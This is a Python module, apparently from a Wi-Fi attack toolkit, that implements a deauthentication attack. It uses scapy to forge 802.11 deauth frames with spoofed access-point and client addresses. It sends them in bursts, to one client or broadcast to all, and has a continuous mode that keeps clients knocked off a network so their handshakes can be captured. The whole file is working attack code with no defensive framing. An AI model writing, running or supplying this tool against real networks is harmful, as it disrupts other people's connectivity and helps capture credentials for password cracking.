"""
Deauthentication Attack Module

Sends deauth frames to force client reconnection for handshake capture.
"""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass
from datetime import datetime

logger = logging.getLogger(__name__)


@dataclass
class DeauthStats:
    """Deauth attack statistics."""

    target_bssid: str
    target_client: str | None
    packets_sent: int = 0
    start_time: datetime | None = None
    end_time: datetime | None = None


class DeauthAttack:
    """
    Deauthentication attack.

    Sends IEEE 802.11 deauth frames to disconnect clients.
    """

    def __init__(self, interface: str):
        """
        Initialize deauth attack.

        Args:
            interface: WiFi interface in monitor mode
        """
        self.interface = interface
        self._running = False
        self._stats: DeauthStats | None = None

    @property
    def stats(self) -> DeauthStats | None:
        """Get attack statistics."""
        return self._stats

    async def send_deauth(
        self,
        bssid: str,
        client: str | None = None,
        count: int = 5,
        interval: float = 0.1,
        channel: int | None = None,
    ) -> int:
        """
        Send deauthentication frames.

        Args:
            bssid: Target AP BSSID
            client: Target client MAC (None = broadcast)
            count: Number of deauth packets
            interval: Interval between packets
            channel: Channel to send on

        Returns:
            Number of packets sent
        """
        target_client = client or "ff:ff:ff:ff:ff:ff"

        self._stats = DeauthStats(
            target_bssid=bssid,
            target_client=client,
            start_time=datetime.now(),
        )

        logger.info(f"Sending {count} deauth packets: {bssid} -> {target_client}")

        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

            # Build deauth packet
            # Deauth from AP to client
            deauth_ap = (
                RadioTap()
                / Dot11(
                    type=0,
                    subtype=12,
                    addr1=target_client,  # Destination
                    addr2=bssid,  # Source (AP)
                    addr3=bssid,  # BSSID
                )
                / Dot11Deauth(reason=7)
            )

            # Deauth from client to AP (if specific client)
            deauth_client = None
            if client:
                deauth_client = (
                    RadioTap()
                    / Dot11(
                        type=0,
                        subtype=12,
                        addr1=bssid,  # Destination (AP)
                        addr2=client,  # Source (Client)
                        addr3=bssid,  # BSSID
                    )
                    / Dot11Deauth(reason=7)
                )

            # Send packets
            packets_sent = 0
            for i in range(count):
                if not self._running and i > 0:
                    break

                # Send AP -> Client deauth
                sendp(deauth_ap, iface=self.interface, verbose=False)
                packets_sent += 1

                # Send Client -> AP deauth (if specific client)
                if deauth_client:
                    sendp(deauth_client, iface=self.interface, verbose=False)
                    packets_sent += 1

                if interval > 0 and i < count - 1:
                    await asyncio.sleep(interval)

            self._stats.packets_sent = packets_sent
            self._stats.end_time = datetime.now()

            logger.info(f"Sent {packets_sent} deauth packets")
            return packets_sent

        except ImportError:
            logger.error("scapy not installed")
            return 0
        except Exception as e:
            logger.error(f"Deauth error: {e}")
            return 0

    async def start_continuous(
        self,
        bssid: str,
        client: str | None = None,
        burst_count: int = 5,
        burst_interval: float = 1.0,
    ) -> None:
        """
        Start continuous deauth attack.

        Args:
            bssid: Target AP BSSID
            client: Target client MAC
            burst_count: Packets per burst
            burst_interval: Interval between bursts
        """
        self._running = True

        while self._running:
            await self.send_deauth(bssid, client, burst_count)
            await asyncio.sleep(burst_interval)

    def stop(self) -> None:
        """Stop continuous attack."""
        self._running = False
        if self._stats:
            self._stats.end_time = datetime.now()
        logger.info("Deauth attack stopped")

